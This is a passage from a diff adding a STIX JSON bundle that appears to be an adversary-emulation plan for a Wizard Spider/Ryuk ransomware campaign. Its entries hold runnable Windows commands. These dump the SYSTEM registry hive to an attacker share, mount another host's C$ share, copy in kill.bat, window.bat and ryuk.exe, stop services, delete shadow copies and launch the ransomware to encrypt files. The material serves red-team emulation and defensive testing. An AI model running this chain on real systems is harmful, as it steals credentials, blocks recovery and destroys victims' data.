+            "created": "2024-02-04T22:05:28.180892Z",
+            "modified": "2024-02-04T22:05:28.180892Z",
+            "name": "Wizard Spider Save Registry Hive",
+            "description": "Uses cmd.exe to execute reg.exe to save HKLM\\SYSTEM\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1003.002",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh": {
+                                "command": "cmd /c \"reg SAVE HKLM\\SYSTEM \\\\TSCLIENT\\X\\SYSTEM_HIVE\"\n"
+                            }
+                        }
+                    },
+                    "technique_name": "OS Credential Dumping: Security Account Manager"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--fb1c581c-bf95-43c2-ae50-b5ce97d5b8f2",
+            "created": "2024-02-04T22:05:28.181146Z",
+            "modified": "2024-02-04T22:05:28.181146Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--bb98782b-2519-4721-a723-b8f027b441d4"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--d9787a1d-0fd4-4776-a073-00423a33e7e2",
+            "created": "2024-02-04T22:05:28.181403Z",
+            "modified": "2024-02-04T22:05:28.181403Z",
+            "name": "Wizard Spider Downloads kill.bat",
+            "description": "Mounts share so Ryuk can encrypt lateral drives.\nDownloads kill.bat, which Ryuk has used for stopping services, disabling services and killing processes.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1105",
+                    "input_arguments": {
+                        "second.target.host": {
+                            "default": "10.0.0.8",
+                            "description": "hostname or IPv4 address of the second target host whose share we will mount to encrypt its drives laterally.",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh": {
+                                "cleanup": "net use /delete Z: ;\nif (Test-Path \"C:\\Users\\Public\\kill.bat\") { rm C:\\Users\\Public\\kill.bat };\n",
+                                "command": "cmd /c \"net use Z: \\\\#{second.target.host}\\C$\";\ncmd /c \"copy \\\\TSCLIENT\\X\\kill.bat C:\\Users\\Public\\kill.bat\";\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Ingress Tool Transfer"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--29ce0b4f-76dc-4e7f-92d8-f55203f3fd45",
+            "created": "2024-02-04T22:05:28.181995Z",
+            "modified": "2024-02-04T22:05:28.181995Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--d9787a1d-0fd4-4776-a073-00423a33e7e2",
+            "target_ref": "ipv4-addr--bbf81084-1444-5c02-95f6-dc7a923e8788"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--bbf81084-1444-5c02-95f6-dc7a923e8788",
+            "value": "10.0.0.8"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--99233788-0185-4370-86b7-49f46e5e200e",
+            "created": "2024-02-04T22:05:28.182324Z",
+            "modified": "2024-02-04T22:05:28.182324Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--d9787a1d-0fd4-4776-a073-00423a33e7e2"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--180eb3b8-1590-4b77-9b8c-7972c198f09e",
+            "created": "2024-02-04T22:05:28.182767Z",
+            "modified": "2024-02-04T22:05:28.182767Z",
+            "name": "Wizard Spider Runs kill.bat",
+            "description": "Ryuk has called kill.bat for stopping services, disabling services and killing processes.\nRyuk can launch icacls /grant Everyone:F /T /C /Q to delete every access-based restrictions on files and directories.\nRyuk has stopped services related to anti-virus.\nThis also covers T1222.001 - File and Directory Permissions Modification: Windows File and Directory Permissions Modification\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1489",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh": {
+                                "command": "cmd /c \"C:\\Users\\Public\\kill.bat\" 2> $null;\nexit 0;\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Service Stop"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--7b89b653-5fd1-4e32-b8c7-b712f9692478",
+            "created": "2024-02-04T22:05:28.183143Z",
+            "modified": "2024-02-04T22:05:28.183143Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--180eb3b8-1590-4b77-9b8c-7972c198f09e"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--69b0a93e-3c71-42f5-8019-13289d9353b3",
+            "created": "2024-02-04T22:05:28.183494Z",
+            "modified": "2024-02-04T22:05:28.183494Z",
+            "name": "Wizard Spider Downloads window.bat",
+            "description": "Downloads window.bat, which will use vssadmin Delete Shadows /all /quiet to delete volume shadow copies and vssadmin resize shadowstorage to force deletion of shadow copies created by third-party applications.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1105",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh": {
+                                "cleanup": "if (Test-Path \"C:\\Users\\Public\\window.bat\") { rm C:\\Users\\Public\\window.bat }\n",
+                                "command": "cmd /c \"copy \\\\TSCLIENT\\X\\window.bat C:\\Users\\Public\\window.bat\"\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Ingress Tool Transfer"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--c676fb3a-32c2-4422-b395-7cd6cee47306",
+            "created": "2024-02-04T22:05:28.183796Z",
+            "modified": "2024-02-04T22:05:28.183796Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--69b0a93e-3c71-42f5-8019-13289d9353b3"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--3f878fc6-d5b0-4c95-b022-88f0becbb61e",
+            "created": "2024-02-04T22:05:28.184114Z",
+            "modified": "2024-02-04T22:05:28.184114Z",
+            "name": "Wizard Spider Runs window.bat",
+            "description": "Ryuk has used vssadmin Delete Shadows /all /quiet to delete volume shadow copies and vssadmin resize shadowstorage to force deletion of shadow copies created by third-party applications.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1490",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh": {
+                                "command": "cmd /c \"C:\\Users\\Public\\window.bat\" 2> $null;\nexit 0;\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Inhibit System Recovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--9987a6ed-e21a-42a4-8d29-8434bcf7b0b5",
+            "created": "2024-02-04T22:05:28.184399Z",
+            "modified": "2024-02-04T22:05:28.184399Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--3f878fc6-d5b0-4c95-b022-88f0becbb61e"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--06b694af-f503-44ca-bc3c-bd017f75ed89",
+            "created": "2024-02-04T22:05:28.184712Z",
+            "modified": "2024-02-04T22:05:28.184712Z",
+            "name": "Wizard Spider Downloads ryuk.exe",
+            "description": "Downloads ryuk.exe ransomware.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1105",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh": {
+                                "cleanup": "if (Test-Path \"C:\\Users\\Public\\ryuk.exe\") { rm C:\\Users\\Public\\ryuk.exe }\n",
+                                "command": "cmd /c \"copy \\\\TSCLIENT\\X\\ryuk.exe C:\\Users\\Public\\ryuk.exe\"\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Ingress Tool Transfer"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--e753bb64-3213-4cdd-9a74-39bbbe512fcd",
+            "created": "2024-02-04T22:05:28.184977Z",
+            "modified": "2024-02-04T22:05:28.184977Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--06b694af-f503-44ca-bc3c-bd017f75ed89"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--cd16fcb6-e1f0-4e0f-bb83-2369516587f2",
+            "created": "2024-02-04T22:05:28.185256Z",
+            "modified": "2024-02-04T22:05:28.185256Z",
+            "name": "Wizard Spider Executes Ryuk Ransomware",
+            "description": "Starts a notepad process and executes ryuk.exe ransomware. When Ryuk executes, it will first gain SeDebugPrivilege.\nRyuk will then inject its own executable into a remote process, notepad.exe, via WriteProcessMemory and\nCreateRemoteThread WinAPI calls. Ryuk uses a symmetric key algorithm, AES256 to encrypt files.\nNote that the symmetric key is itself encrypted with RSA2048.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1486",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh": {
+                                "command": "Start-Process C:\\Windows\\System32\\notepad.exe;\ncmd /c \"C:\\Users\\Public\\ryuk.exe --encrypt --process-name notepad.exe\";\n",
+                                "timeout": 300
+                            }
+                        }
+                    },
+                    "technique_name": "Data Encrypted for Impact"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--82f7f669-0456-4d99-a2b6-a91614b6a61b",
+            "created": "2024-02-04T22:05:28.185495Z",
+            "modified": "2024-02-04T22:05:28.185495Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--cd16fcb6-e1f0-4e0f-bb83-2369516587f2"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--95d6c92c-e328-4997-ae01-507b709dfa7b",
+            "created": "2024-02-04T22:05:28.185718Z",
+            "modified": "2024-02-04T22:05:28.185718Z",
+            "name": "Terminate RDP Session to Domain Controller",
+            "description": "End the RDP session to the Domain Controller.\nThis ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),\nsince the RDP connection originates from the attacker's machine.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1021.001",
+                    "input_arguments": null,
+                    "platforms": {
+                        "linux": {
+                            "proc": {
+                                "command": "pkill xfreerdp\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Remote Services: Remote Desktop Protocol"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--550b7578-fd47-4a21-90d9-c16c43257e09",
+            "created": "2024-02-04T22:05:28.185963Z",
+            "modified": "2024-02-04T22:05:28.185963Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--95d6c92c-e328-4997-ae01-507b709dfa7b"
+        }
+    ]
+}
